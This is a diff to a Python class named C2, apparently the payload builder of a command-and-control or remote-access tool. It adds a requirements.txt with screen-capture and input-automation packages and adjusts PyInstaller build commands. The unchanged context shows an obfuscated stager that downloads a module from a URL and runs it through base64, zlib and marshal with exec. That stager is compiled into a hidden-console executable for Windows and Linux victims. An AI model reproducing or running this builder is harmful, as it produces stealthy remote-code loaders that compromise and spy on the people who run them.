@@ -226,6 +226,24 @@ class C2:
         date = datetime.datetime.utcnow().strftime("%Y-%m-%d-%H-%M-%S")
         payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"
 
+        requ_numpy="1.24.4"
+
+        if os_name == "Windows":
+            requ_numpy = "2.2.1"
+
+        with open('requirements.txt', 'w') as f:
+            f.writelines("""
+requests==2.31.0
+python-socketio==5.11.0
+urllib3<2.0
+websocket-client==1.6.1
+chardet==5.2.0
+mss==9.0.2
+Pillow==10.4.0
+numpy=="""+requ_numpy+"""
+PyAutoGUI
+opencv-python-headless""")
+
         payload = f"""url = "{url}"
 file_path = "{payload_file_name}"
 def create_moduel(url):
@@ -261,7 +279,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=numpy==2.2.1 --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
@@ -274,7 +292,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             elif os_name == "Linux":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=numpy==1.24.4 --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-linux:latest "pyinstaller -F --onefile --windowed --runtime-tmpdir /tmp --icon=NONE --hidden-import=pty --hidden-import=pyautogui --hidden-import=tkinter --hidden-import=PyOpenGL --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
